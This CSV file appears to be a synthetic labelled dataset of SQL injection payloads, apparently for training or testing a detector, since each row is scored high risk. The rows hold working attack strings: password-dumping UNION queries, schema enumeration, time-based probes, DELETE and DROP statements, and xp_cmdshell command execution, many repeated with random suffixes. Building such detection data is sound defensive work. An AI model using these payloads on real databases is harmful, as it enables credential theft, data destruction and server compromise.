query,risk,score
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1,high,70
'; DELETE FROM users; /**/ # uul34,high,70
'; DROP PROCEDURE admin_login-- # j4dw7,high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- kuik",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- lx9x",high,70
' OR SLEEP(5) AND '1'='1 -- 2ccj,high,70
'; SELECT pg_sleep(5); -- AND 1=1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- qyc3,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- wtrw,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
' OR 1=1; DROP TABLE temp; -- -- oiva,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- d3ei,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 43lph",high,70
"' UNION ALL SELECT username, password FROM users # dag3e",high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- dkub,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- qlky",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1",high,70
'; DROP PROCEDURE admin_login-- AND 1=1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # ",high,70
' OR SLEEP(5) AND '1'='1 # cfwo4,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
' OR SLEEP(5) AND '1'='1 # kdpw8,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
"' UNION ALL SELECT username, password FROM users # 1z6vu",high,70
'; DELETE FROM users; /**/ -- 1bs3,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- vwoz",high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
'; DELETE FROM users; /**/ -- 01uo,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- p9oy,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # ,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # pi0i8",high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1,high,70
'; WAITFOR DELAY '0:0:5'-- # d3f2k,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
'; SELECT pg_sleep(5); -- -- z0lo,high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1",high,70
' OR SLEEP(5) AND '1'='1 # sb96r,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # zasz7,high,70
' OR SLEEP(5) AND '1'='1 -- hukd,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
'; DROP PROCEDURE admin_login-- LIMIT 1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- du4a",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- xvlb",high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1,high,70
'; DROP PROCEDURE admin_login-- # bew1c,high,70
'; SELECT pg_sleep(5); -- OR 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1,high,70
"' UNION ALL SELECT username, password FROM users # lyp26",high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 -- ,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 -- ",high,70
'; WAITFOR DELAY '0:0:5'-- /**/ # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1,high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1",high,70
'; SELECT pg_sleep(5); -- OR 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- 1ro4",high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
'; SELECT pg_sleep(5); -- -- zrht,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1",high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- 294p",high,70
'; SELECT pg_sleep(5); -- OR 1=1 -- ,high,70
'; DELETE FROM users; /**/ LIMIT 1,high,70
'; DROP PROCEDURE admin_login-- -- a6gb,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # w18gt",high,70
"' UNION ALL SELECT username, password FROM users # 60twb",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
' OR SLEEP(5) AND '1'='1 -- 05z9,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
'; DROP PROCEDURE admin_login-- AND 1=1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- u93z",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # ,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
'; WAITFOR DELAY '0:0:5'-- # g6rew,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- # fvtow,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 -- ",high,70
'; DELETE FROM users; /**/ -- 4u0c,high,70
'; SELECT pg_sleep(5); -- -- 7zlq,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1",high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
'; DROP PROCEDURE admin_login-- # hlzaj,high,70
' OR 1=1; DROP TABLE temp; -- -- s4mk,high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
' OR SLEEP(5) AND '1'='1 # ypmiy,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
'; DROP PROCEDURE admin_login-- -- alul,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- mqad,high,70
'; WAITFOR DELAY '0:0:5'-- /**/ # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 5a4ko,high,70
"' UNION ALL SELECT username, password FROM users # oik1i",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # i016c",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- fof2",high,70
'; DELETE FROM users; /**/ AND 1=1,high,70
'; WAITFOR DELAY '0:0:5'-- -- zh6f,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # ",high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # artdy,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # rg2jr,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1,high,70
'; DELETE FROM users; /**/ -- 9zyp,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # ",high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1,high,70
'; SELECT pg_sleep(5); -- AND 1=1,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 -- ,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
'; DELETE FROM users; /**/ -- nc16,high,70
'; DELETE FROM users; /**/ LIMIT 1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- vihm,high,70
'; WAITFOR DELAY '0:0:5'-- -- 8gr0,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 -- ",high,70
'; DROP PROCEDURE admin_login-- AND 1=1,high,70
'; DROP PROCEDURE admin_login-- LIMIT 1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # bdg7m",high,70
'; SELECT pg_sleep(5); -- AND 1=1,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- abz7,high,70
'; WAITFOR DELAY '0:0:5'-- # wbdl9,high,70
'; SELECT pg_sleep(5); -- LIMIT 1,high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
' OR SLEEP(5) AND '1'='1 # k3c0t,high,70
'; DELETE FROM users; /**/ LIMIT 1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # gk0q9",high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 -- ,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
' OR SLEEP(5) AND '1'='1 /**/ # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1",high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1,high,70
'; DELETE FROM users; /**/ -- ygmb,high,70
"' UNION ALL SELECT username, password FROM users # dm92r",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 9fqhp,high,70
' OR SLEEP(5) AND '1'='1 # 3cpd6,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # b45z7",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- fdqc",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 -- ",high,70
'; DROP PROCEDURE admin_login-- # 563gk,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # 6tg84",high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- qrv1",high,70
' OR SLEEP(5) AND '1'='1 /**/ # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1,high,70
'; WAITFOR DELAY '0:0:5'-- # ftd2t,high,70
' OR 1=1; DROP TABLE temp; -- -- y035,high,70
' OR SLEEP(5) AND '1'='1 # wvm3s,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # s8q1x",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1",high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1,high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users /**/ # ",high,70
'; WAITFOR DELAY '0:0:5'-- -- gh7z,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # 9ut9h",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 92flt,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- dfa5,high,70
"' UNION ALL SELECT username, password FROM users -- za0b",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
' OR SLEEP(5) AND '1'='1 -- 7vzs,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # tletq",high,70
'; DROP PROCEDURE admin_login-- AND 1=1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 -- ",high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # ",high,70
'; SELECT pg_sleep(5); -- AND 1=1,high,70
' OR 1=1; DROP TABLE temp; -- -- ubvd,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- l2xh,high,70
'; DROP PROCEDURE admin_login-- AND 1=1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1",high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 62dj0",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1,high,70
'; DELETE FROM users; /**/ # 5h099,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # i576q,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # cibbj,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ # ,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # 6nhbz,high,70
'; DROP PROCEDURE admin_login-- AND 1=1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- 3l4f,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- k669",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- uwip",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
"' UNION ALL SELECT username, password FROM users /**/ # ",high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
'; SELECT pg_sleep(5); -- /**/ # ,high,70
' OR 1=1; DROP TABLE temp; -- # casbt,high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1,high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1",high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- pbqh,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users # czb2l",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # 0i7to,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ # ,high,70
'; SELECT pg_sleep(5); -- LIMIT 1,high,70
'; DELETE FROM users; /**/ LIMIT 1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # hixwv",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1,high,70
' OR SLEEP(5) AND '1'='1 # wg2z3,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users /**/ # ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1",high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # jykvz,high,70
'; DELETE FROM users; /**/ # r9qk3,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 4f52g",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # po2ia,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- nvfw,high,70
'; WAITFOR DELAY '0:0:5'-- -- pa45,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 -- ,high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- sxk5,high,70
'; DELETE FROM users; /**/ # hef2n,high,70
'; DROP PROCEDURE admin_login-- # uzrj9,high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
'; DELETE FROM users; /**/ # som5k,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ex8x,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # ,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1",high,70
'; DROP PROCEDURE admin_login-- # uh1k4,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
'; WAITFOR DELAY '0:0:5'-- # ci442,high,70
'; WAITFOR DELAY '0:0:5'-- # e0tia,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- 7xbv",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 78oma,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1,high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- y488,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 36sx",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # f5vsi",high,70
' OR 1=1; DROP TABLE temp; -- /**/ # ,high,70
'; DELETE FROM users; /**/ AND 1=1,high,70
'; SELECT pg_sleep(5); -- # edc8j,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- /**/ # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # il2ec,high,70
' OR SLEEP(5) AND '1'='1 /**/ # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1,high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # e63sl,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- h23h,high,70
' OR 1=1; DROP TABLE temp; -- /**/ # ,high,70
'; DELETE FROM users; /**/ -- bb88,high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1",high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ # ,high,70
' OR SLEEP(5) AND '1'='1 # oj3u9,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 -- ",high,70
' OR SLEEP(5) AND '1'='1 # 53z4s,high,70
'; DELETE FROM users; /**/ -- 131t,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 -- ",high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- uwnv,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- hxhu",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1",high,70
'; DROP PROCEDURE admin_login-- OR 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1,high,70
'; WAITFOR DELAY '0:0:5'-- # mgpyy,high,70
' OR 1=1; DROP TABLE temp; -- # gbisc,high,70
'; DROP PROCEDURE admin_login-- # f610r,high,70
"' UNION ALL SELECT username, password FROM users # 7m4y3",high,70
'; DELETE FROM users; /**/ LIMIT 1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- 9oaw,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1,high,70
'; WAITFOR DELAY '0:0:5'-- -- gopv,high,70
' OR SLEEP(5) AND '1'='1 /**/ # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # tah99",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ # ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 -- ",high,70
"' UNION ALL SELECT username, password FROM users # wnkyf",high,70
'; DELETE FROM users; /**/ /**/ # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # ",high,70
'; DROP PROCEDURE admin_login-- # p1x0b,high,70
'; DELETE FROM users; /**/ -- 01ab,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- m0b6,high,70
' OR SLEEP(5) AND '1'='1 -- 8jy5,high,70
'; SELECT pg_sleep(5); -- LIMIT 1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # a3si6,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1",high,70
'; SELECT pg_sleep(5); -- AND 1=1,high,70
'; DELETE FROM users; /**/ AND 1=1,high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1,high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1,high,70
'; DELETE FROM users; /**/ OR 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- auyo",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- dxft",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1",high,70
'; DROP PROCEDURE admin_login-- LIMIT 1,high,70
'; SELECT pg_sleep(5); -- LIMIT 1,high,70
